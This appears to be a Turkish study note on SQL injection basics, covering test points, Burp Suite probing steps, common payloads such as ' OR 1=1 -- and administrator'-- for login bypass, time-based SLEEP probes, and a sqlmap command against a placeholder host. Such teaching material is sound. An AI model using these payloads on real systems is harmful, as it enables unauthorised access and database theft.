---
title: "SQL Injection Temelleri"
ana-not: "[[00_Web_Hacking_Index]]"
tarih: 2026-11-19
aliases:
  - SQL Injection Temelleri
tags:
  - siber-guvenlik
  - web-hacking
  - sqli
  - temel
---

# SQL Injection Temelleri

> 📚 [İndeks](00_Web_Hacking_Index.md) · [SQLi UNION Saldırıları](01.1_SQLi_Union.md) ▶

**Etiket:** #web_hacking
**Temel Hedef:** Kullanıcı girdisi üzerinden arka plandaki veritabanı sorgusunu manipüle etmek.

---

## 🔎 Test Noktaları (Web Sitesinde Nereye Bakılır?)
URL parametreleri (`?id=1`), arama çubukları, login formları, HTTP Header'ları (User-Agent, Referer vb.).

## 🛠️ Burp Suite Keşif Adımları
1. İsteği Intercept ile yakala ve Repeater'a yolla.
2. Hedef parametrenin sonuna tek tırnak (`'`) ekle. Sunucu `500 Internal Server Error` veya veritabanı hatası (syntax error) dönüyorsa açık potansiyeli yüksektir.
3. Mantıksal doğrulama (Boolean test) yap:
   - `id=1 AND 1=1` (Sorgu True döner -> Sayfa normal yüklenmeli)
   - `id=1 AND 1=2` (Sorgu False döner -> Sayfa boş veya hatalı yüklenmeli)

## 💣 Sık Kullanılan Temel Payloadlar
- **Login Bypass (Auth Atlatma):** `' OR 1=1 --`
- **Sütun Sayısı Bulma:** `' ORDER BY 3 --`
- **Gecikme Yaratma (Time Based):** `' OR SLEEP(5) --` (PostgreSQL için `pg_sleep(5)`)
- **Sorgunun Devamını Silme / Kesme:** `--` (Çift tire). Kendinden sonra gelen tüm orijinal SQL komutlarını (örneğin istenmeyen `AND released=1` filtrelerini) yorum satırına çevirerek tamamen etkisiz hale getirir. *(Not: Çoğu veritabanında çalışması için `--` işaretinden sonra bir boşluk bırakmak gerekebilir: `-- `)*
- **Belirli Kullanıcıyla Login Bypass:** `administrator'--` (Şifre alanına ne yazarsan yaz, şifre kontrolünü siler ve hesaba sokar)

## ⚙️ Yardımcı Araç Komutu (SQLMap)
```bash
sqlmap -u "http://hedefsite.com/page?id=1" --dbs --batch

```

---
## 🎯 SQLi Saldırı Yüzeyleri (Query İçinde Nereye Sızıyoruz?)
Zafiyetler sadece standart yerlerde değil, sorgunun birçok farklı noktasında olabilir:
- **`SELECT`** sorgularında: Genellikle **`WHERE`** koşulunda bulunur. Ayrıca doğrudan tablo/sütun isimlerinde veya sıralama yapan **`ORDER BY`** koşulunda da olabilir.
- **`UPDATE`** sorgularında: Güncellenen değerlerin içinde veya `WHERE` koşulunda.
- **`INSERT`** sorgularında: Tabloya eklenen yeni değerlerin (`VALUES`) içinde.

## Örnek SQL Komutu:
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
-  Yılzdız Bütün detayları al demek.
- **`products`** From products diyince productstakileri çekiyor.
- **`category`** Neresi kategorisi hediye ve released'ı  bir neresi ise verisini çek diyoruz.

## 🔗 Alt Kategoriler ve Spesifik Taktikler
*(Eğitimde yeni modüllere geçtikçe dosyalarını oluşturup buraya bağlayabilirsin)*
- [01.1_SQLi_Union](01.1_SQLi_Union.md)
- [01.2_Blind_SQL](01.2_Blind_SQL.md)
- [01.3_Error-Based_SQL_Injection](01.3_Error-Based_SQL_Injection.md)
- [01.4_Time_Based_Blind_SQL](01.4_Time_Based_Blind_SQL.md)
- [Out-of-Band (OAST)](01.5_Out-of-Band_OAST.md)
- [Farklı Bağlamlarda SQLi](01.6_Farkl%C4%B1_Ba%C4%9Flamlarda_SQLi.md)

---
> 📚 [İndeks](00_Web_Hacking_Index.md) · [SQLi UNION Saldırıları](01.1_SQLi_Union.md) ▶
